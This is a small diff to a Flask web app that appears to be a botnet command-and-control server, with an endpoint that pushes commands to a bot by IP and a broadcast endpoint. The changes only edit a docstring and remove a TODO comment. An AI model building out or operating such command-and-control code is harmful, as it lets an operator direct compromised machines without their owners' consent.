@@ -199,12 +199,11 @@ def register():
 @app.route('/bot/<bot_ip>/push', methods=['POST'])
 def botpush(bot_ip):
     """
-    Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!
+    Description: Pushes the command into the cmd Model. 
 
     [POST]
         - masterkey = Master's secret key 
         - cmd = Command to push to the bot 
-
     """
 
     # Error checking 
@@ -434,10 +433,6 @@ def broadcast():
         return jsonify({ 'error': str(e) })
 
     return jsonify({ 'result': '[+] Broadcast successful' })
-
-
-# TODO: filer endpoint? Or just expand list endpoint to filter 
-# based on the POST request parameters ('find') ? 
 
 # This is for testing purposes 
 @app.route('/files')
